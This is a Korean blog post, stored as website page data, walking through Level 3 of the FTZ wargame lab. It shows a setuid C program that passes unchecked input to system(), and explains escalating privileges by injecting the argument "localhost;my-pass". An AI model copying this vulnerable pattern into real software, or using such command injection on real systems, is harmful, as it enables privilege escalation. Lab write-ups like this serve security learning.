{"componentChunkName":"component---src-templates-blog-post-tsx","path":"/articles/2015-06/FTZ-level3","result":{"data":{"site":{"siteMetadata":{"title":"GyeongSu Han's Github Pages","author":"@micalgenus","siteUrl":"https://micalgenus.github.io"}},"markdownRemark":{"id":"535db000-e4dd-5405-8645-65a42c6acd96","html":"<p>Level3의 힌트를 보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">[</span>level3@ftz level3<span class=\"token punctuation\">]</span>$ cat hint\n다음 코드는 autodig의 소스이다<span class=\"token punctuation\">.</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">char</span> cmd<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> argc<span class=\"token operator\">!=</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"Auto Digger Version 0.9\\n\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"Usage : %s host\\n\"</span><span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span> cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"dig @\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span> cmd<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span> cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\" version.bind chaos txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span> cmd <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n\n이를 이용하여 level4의 권한을 얻어라<span class=\"token punctuation\">.</span>\n\nmore hints<span class=\"token punctuation\">.</span>\n<span class=\"token operator\">-</span> 동시에 여러 명령어를 사용하려면<span class=\"token operator\">?</span>\n<span class=\"token operator\">-</span> 문자열 형태로 명령어를 전달하려면<span class=\"token operator\">?</span></code></pre></div>\n<p>autodig를 사용하라고 한다. <code class=\"language-text\">strcpy</code>와 <code class=\"language-text\">strcat</code>을 이용하여 cmd라는 배열에 최종적으로</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\"dig @'인자로 받은 문자열' version.bind chaos txt\"</code></pre></div>\n<p>라는 문자열을 만들게 된다. 이 문제에서 dig는 별로 중요하지 않지만 dig는 인자로 받은 주소(네트워크 주소)에 대한 정보를 알려주는 명령어이다.</p>\n<p>여기서 중요한 것은 힌트를 보게 되면 동시에 여러 명령어를 사용하려면 인데, 리눅스에서 동시에 여러 명령어를 사용하려면 <code class=\"language-text\">;</code>를 기준으로 사용하면 된다. 우리가 코딩을 할 때 ;을 기준으로 문장을 끝내듯이, 리눅스 명령을 사용할 때에도 ;을 기준점으로 사용하면 된다.</p>\n<p><code class=\"language-text\">pwd; cd /; pwd;</code>을 예시로 사용해 보겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level3@ftz level3<span class=\"token punctuation\">]</span>$ <span class=\"token builtin class-name\">pwd</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">cd</span> /<span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">pwd</span>\n/home/level3\n/</code></pre></div>\n<p>첫 pwd에 의해서 현재 디렉토리의 위치를 출력해 주고, 가운데 <code class=\"language-text\">cd /</code>에 의해 /디렉토리로 이동됬다. 그 후 마지막 <code class=\"language-text\">pwd</code>에 의해 /의 위치임을 출력하게 되었다. 이렇게 한번의 명령을 보낼 때 <code class=\"language-text\">;</code>을 기준으로 여러 명령을 보낼수 있다.</p>\n<p>이점을 이용하여 이번 문제를 해결해 보겠다.</p>\n<p>우선 파일의 위치를 검색한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>level3@ftz level3<span class=\"token punctuation\">]</span>$ <span class=\"token function\">find</span> / -user level4 -perm +6000 <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n/bin/autodig</code></pre></div>\n<p>파일을 실행 할 때 my-pass명령어를 실행 시키도록 하겠다. <code class=\"language-text\">;</code>을 사용하면 되므로, 인자를 <code class=\"language-text\">localhost;my-pass</code>로 주겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[level3@ftz level3]$ /bin/autodig localhost;my-pass\n; &lt;&lt;>> DiG 9.2.1 &lt;&lt;>> @localhost version.bind chaos txt\n;; global options:  printcmd\n;; connection timed out; no servers could be reached\n\nLevel3 Password is \"can you fly?\".</code></pre></div>\n<p>Level4의 password가 아닌 Level3의 password를 보여주고 있다. 명령이 제대로 들어가지 않은 것이다. 이 부분에서 hint의 2번째를 생각해야 한다.</p>\n<p>문자열의 형태로 보낸다는 것은 우리가 적은 인자는 문자열의 형태가 아닌 ;를 기준으로 끊어 보내게 된다. 그러므로 /bin/autodig localhost라는 문장과 my-pass라는 문장을 끊어서 해석하게 된다.</p>\n<p>그렇게 되면 /bin/autodig localhost가 끝나게 되면 my-pass를 실행시키게 되는데, setuid가 걸려있는 프로그램에서 실행시키는 것이 아닌 <strong>현재 터미널</strong>에서 실행시키게 되어 권한은 level3의 권한을 유지하고 있다.</p>\n<p>문장을 한번에 보내기 위해서는 <code class=\"language-text\">\"\"</code>를 사용하여 보내고자 하는 부분을 묶어 보내야 한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[level3@ftz level3]$ /bin/autodig \"localhost;my-pass\"\n; &lt;&lt;>> DiG 9.2.1 &lt;&lt;>> @localhost\n;; global options:  printcmd\n;; connection timed out; no servers could be reached\n\nLevel4 Password is \"           \".</code></pre></div>\n<p>이렇게 \"\"를 사용하게 되면 원하는 문자열로 보낼 수 있다.</p>","frontmatter":{"categories":["Wargame"],"title":"FTZ Level3","date":"Jun 29, 2015","tags":["FTZ"]}}},"pageContext":{"comments":true,"previous":{"frontmatter":{"path":"/articles/2015-06/함수-호출-규약","title":"함수 호출 규약","comments":true}},"next":{"frontmatter":{"path":"/articles/2015-06/python-2.7-upgrade","title":"python 2.7 upgrade","comments":true}}}}}